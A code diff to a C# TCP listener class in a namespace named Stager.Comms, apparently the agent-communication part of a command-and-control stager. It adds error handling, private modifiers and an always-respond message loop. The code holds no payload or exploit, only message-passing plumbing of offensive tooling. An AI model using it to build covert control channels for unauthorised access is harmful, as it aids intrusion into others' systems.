@@ -24,7 +24,16 @@ namespace Stager.Comms
 
         public override void Start()
         {
-            Listener.Start();
+            try
+            {
+                Listener.Start();
+                Status = ModuleStatus.Running;
+            }
+            catch
+            {
+                Status = ModuleStatus.Terminated;
+            }
+            
 
             Task.Factory.StartNew(delegate ()
             {
@@ -41,7 +50,7 @@ namespace Stager.Comms
             });
         }
 
-        void AcceptCallback(IAsyncResult ar)
+        private void AcceptCallback(IAsyncResult ar)
         {
             Event.Set();
 
@@ -56,7 +65,7 @@ namespace Stager.Comms
             }
         }
 
-        void ReadCallback(IAsyncResult ar)
+        private void ReadCallback(IAsyncResult ar)
         {
             var state = ar.AsyncState as CommStateObject;
             var stream = state.Worker as NetworkStream;
@@ -67,31 +76,34 @@ namespace Stager.Comms
             {
                 bytesRead = stream.EndRead(ar);
             }
-            catch
-            {
-
-            }
+            catch { }
 
             if (bytesRead > 0)
             {
                 var data = DataJuggle(bytesRead, stream, state);
-                var messageIn = Utilities.DeserialiseData<AgentMessage>(data);
 
-                if (messageIn != null)
+                var inbound = Utilities.DeserialiseData<AgentMessage>(data);
+
+                if (inbound != null && inbound.Data != null)
                 {
-                    Inbound.Enqueue(messageIn);
+                    Inbound.Enqueue(inbound);
                 }
+
             }
+
+            var outbound = new AgentMessage();
 
             if (Outbound.Count > 0)
             {
-                var messageOut = Outbound.Dequeue();
-                var dataToSend = Utilities.SerialiseData(messageOut);
-                stream.BeginWrite(dataToSend, 0, dataToSend.Length, new AsyncCallback(WriteCallback), stream);
+                outbound = Outbound.Dequeue();
             }
+
+            var dataToSend = Utilities.SerialiseData(outbound);
+
+            stream.BeginWrite(dataToSend, 0, dataToSend.Length, new AsyncCallback(WriteCallback), stream);
         }
 
-        void WriteCallback(IAsyncResult ar)
+        private void WriteCallback(IAsyncResult ar)
         {
             var stream = ar.AsyncState as NetworkStream;
 
